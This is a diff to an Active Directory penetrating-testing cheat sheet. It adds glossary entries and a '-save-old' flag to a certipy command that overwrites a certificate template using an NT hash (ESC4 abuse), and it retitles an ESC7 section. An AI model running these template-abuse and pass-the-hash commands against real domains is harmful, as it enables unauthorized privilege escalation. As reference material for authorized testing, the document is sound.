@@ -18,6 +18,9 @@ The Distributed File System provide the ability to group shares on multiple serv
 ## Domain Joined Computer 
 A Windows computer for which a computer account has been created. This computer takes over the settings from the Active Directory.
 
+## fCONFIDENTIAL
+If this flag is set for an LDAP attribute, only accounts with the permissions RIGHT_DS_READ_PROPERTY and RIGHT_DS_CONTROL_ACCESS can read the attribute (example: ms-Mcs-AdmPwd).
+
 ## FQDN 
 The Full Qualified Domain Name represents the full name in the domain context (e.g. dnshostname.domaincomponent.domaincompontent)
 
@@ -68,6 +71,9 @@ A System Access Control List describes which accesses to objects are to be logge
 
 ## SAM 
 The Security Account Manger is the logon name used to support clients and servers running earlier versions of windos, such as NT 4.0, 95, 98 and LAN Manager. Duplicate in database is not possible.
+
+## SCCM
+The System Center Configuration Manager is deployment software.
 
 ## Security Principal 
 A user or computer account, group or process running in a security context.
@@ -754,7 +760,7 @@ ESC4 is when a user has write privileges over a certificate template.
 Overwrite the template and make it vulnerable to ESC1:
 
 ```
-$> certipy template '<domain>/<user>'@<certificateRhost> -hashes :<ntHash> -template 'ESC4'
+$> certipy template '<domain>/<user>'@<certificateRhost> -hashes :<ntHash> -template 'ESC4' -save-old
 ```
 
 Request a certificate:
@@ -775,7 +781,7 @@ $> certipy template '<domain>/<user>'@<certificatesRhost> -hashes :<ntHash> -tem
 ESC6 is when the CA specifies the EDITF_ATTRIBUTESUBJECTALTNAME2 flag.
 In essence, this flag allows the enrollee to specify an arbitrary SAN on all certificates despite a certificate template’s configuration (see ESC1).
 
-## Manage CA & Manage Certificates
+### ESC7 (Manage CA & Manage Certificates)
 
 In order for this technique to work, the user must also have the Manage Certificates access right, and the certificate template SubCA must be enabled.
 Add Manage Certificates access right:
